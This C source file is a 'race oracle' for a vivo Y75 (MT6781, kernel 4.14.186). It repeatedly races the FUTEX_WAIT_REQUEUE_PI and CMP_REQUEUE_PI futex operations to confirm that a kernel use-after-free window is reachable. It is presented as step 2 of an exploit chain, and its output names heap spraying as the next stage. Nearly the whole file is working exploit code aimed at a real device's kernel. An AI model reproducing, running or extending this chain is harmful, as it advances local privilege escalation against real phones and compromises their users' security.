/*
 * race_oracle.c — Step 2 live device check for vivo Y75 (V2117 MT6781) 4.14.186
 * No spray, no write — just proves FUTEX_WAIT_REQUEUE_PI UAF window exists.
 * Success = waiter returns errno 35 (EDEADLK) on at least one round.
 * Build: aarch64-linux-gnu-gcc -O2 -static -pthread -o race_oracle race_oracle.c
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <linux/futex.h>
#include <stdint.h>
#include <signal.h>
#include <time.h>
#include <stdatomic.h>
#include <sched.h>

static uint32_t fw, ft, fc;
static atomic_int ready, waiting, started, consumed, saw_edeadlk, waiter_errno;

static void *th_owner(void *a){
    (void)a;
    syscall(SYS_futex, &ft, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    while(!atomic_load(&ready)) usleep(200);
    atomic_store(&started, 1);
    syscall(SYS_futex, &fc, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    return NULL;
}
static void *th_waiter(void *a){
    (void)a;
    syscall(SYS_futex, &fc, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    atomic_store(&ready, 1);
    while(!atomic_load(&started)) usleep(200);
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC,&ts); ts.tv_sec+=3;
    atomic_store(&waiting, 1);
    errno=0;
    int r=syscall(SYS_futex, &fw, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &ft, 0);
    int e=errno;
    atomic_store(&waiter_errno, e);
    if(r==-1 && e==35) atomic_store(&saw_edeadlk, 1);
    // printf in thread is racy but useful
    // keep quiet, parent reads atomics
    (void)r;
    // wait for main to signal via consumed
    while(!atomic_load(&consumed)) usleep(1000);
    return NULL;
}

static int run_round(int round){
    fw=0; ft=0; fc=0;
    atomic_store(&ready,0); atomic_store(&waiting,0);
    atomic_store(&started,0); atomic_store(&consumed,0);
    atomic_store(&saw_edeadlk,0); atomic_store(&waiter_errno,0);
    pthread_t to,tw;
    pthread_create(&to,NULL,th_owner,NULL);
    pthread_create(&tw,NULL,th_waiter,NULL);
    while(!atomic_load(&waiting) || !atomic_load(&started)) usleep(1000);
    usleep(50000);
    errno=0;
    long r=syscall(SYS_futex, &fw, FUTEX_CMP_REQUEUE_PI, 1, (void*)1, &ft, 0);
    int requeue_errno=errno;
    // let waiter timeout/requeue
    usleep(3500000);
    atomic_store(&consumed,1);
    pthread_join(tw,NULL);
    pthread_detach(to);
    int e=atomic_load(&waiter_errno);
    int hit=atomic_load(&saw_edeadlk);
    printf("[*] Round %d: requeue ret=%ld errno=%d | waiter errno=%d %s\n",
           round, r, requeue_errno, e, hit?"HIT EDEADLK=35":"");
    return hit;
}

int main(void){
    setbuf(stdout,NULL);
    // pin to core 0 like IonStack
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs);
    sched_setaffinity(0,sizeof(cs),&cs);
    printf("\n=== Y75 Step 2: race oracle (no spray, no write) ===\n");
    printf("[*] V2117 4.14.186-gdfd963175-dirty | paranoid -1 expected\n");
    printf("[*] Looking for waiter errno 35 (EDEADLK) across 8 rounds\n\n");
    int total_hits=0;
    for(int i=1;i<=8;i++){
        pid_t pid=fork();
        if(pid==0){ int h=run_round(i); _exit(h?0:1); }
        int st; waitpid(pid,&st,0);
        int hit=(WIFEXITED(st) && WEXITSTATUS(st)==0);
        if(hit) total_hits++;
        usleep(300000);
    }
    printf("\n=== result: %d/8 rounds hit EDEADLK ===\n", total_hits);
    if(total_hits>0){
        printf("[+] UAF window is REACHABLE on this kernel — Step 2 PASS\n");
        printf("[*] Next: fix waiter location in Ghidra (futex_requeue sp+X) before any spray\n");
        return 0;
    } else {
        printf("[-] No EDEADLK seen — opcode 11 may be filtered or timing off\n");
        printf("[*] Try: rerun, check dmesg, confirm FUTEX_WAIT_REQUEUE_PI=11 supported\n");
        return 1;
    }
}
